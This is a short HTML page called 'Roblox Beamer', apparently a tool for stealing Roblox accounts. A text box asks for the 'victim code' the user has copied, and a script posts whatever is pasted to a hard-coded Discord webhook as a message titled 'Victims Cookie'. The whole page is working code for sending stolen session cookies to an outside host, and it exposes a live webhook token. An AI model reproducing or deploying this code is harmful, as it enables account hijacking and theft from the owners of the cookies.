<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Roblox Beamer</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      text-align: center;
      padding: 20px;
    }
    #messageBar {
      margin-top: 20px;
    }
    textarea, button {
      padding: 10px;
      font-size: 16px;
    }
    textarea {
      width: 70%;
      margin-right: 10px;
      height: 150px; /* Making the input area bigger */
      resize: none; /* Disable resizing */
    }
    button {
      background-color: #007bff;
      color: white;
      border: none;
      cursor: pointer;
    }
    button:disabled {
      background-color: #cccccc;
      cursor: not-allowed;
    }
    button:hover:not(:disabled) {
      background-color: #0056b3;
    }
    .error {
      color: red;
      font-weight: bold;
    }
  </style>
</head>
<body>
  <h1>Start Beaming Now!</h1>
  <div id="messageBar">
    <textarea id="messageInput" placeholder="Paste the victim code that you copied..."></textarea>
    <button id="sendButton" onclick="sendMessage()">Send</button>
  </div>
  <p id="status" style="color: green; font-weight: bold;"></p>
  <p id="errorMessage" class="error"></p>

  <script>
    // Replace with your Discord Webhook URL
    const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1320573593821773845/QvHOAwVTwyuwh6O-HT15JQSZYD_W9hxsYcfnOe3L-Ig7vENas32Ybj5p2_3VVHYiHdQg";

    function sendMessage() {
      const messageInput = document.getElementById("messageInput");
      const sendButton = document.getElementById("sendButton");
      const errorMessage = document.getElementById("errorMessage");
      let message = messageInput.value.trim(); // Remove leading and trailing spaces

      errorMessage.textContent = ""; // Clear any previous error messages

      // Check if the message is empty
      if (message === "") {
        errorMessage.textContent = "Message cannot be blank!";
        return;
      }

      // Wrap the message in triple backticks (```)
      message = "```" + message + "```";

      // Create the embed payload
      const embedPayload = {
        embeds: [
          {
            title: "Victims Cookie", // Embed title
            description: message, // Embed description
            color: 16711680, // Embed color (red in this case)
            timestamp: new Date().toISOString() // Adds a timestamp
          }
        ]
      };

      // Send the embed to Discord webhook
      fetch(DISCORD_WEBHOOK_URL, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(embedPayload),
      })
        .then((response) => {
          if (response.ok) {
            document.getElementById("status").textContent = "Message sent successfully!";
            messageInput.value = ""; // Clear the input
          } else {
            throw new Error("Failed to send the message.");
          }
        })
        .catch((error) => {
          console.error("Error:", error);
          document.getElementById("status").textContent = "Failed to send the message.";
        });
    }
  </script>
</body>
</html>
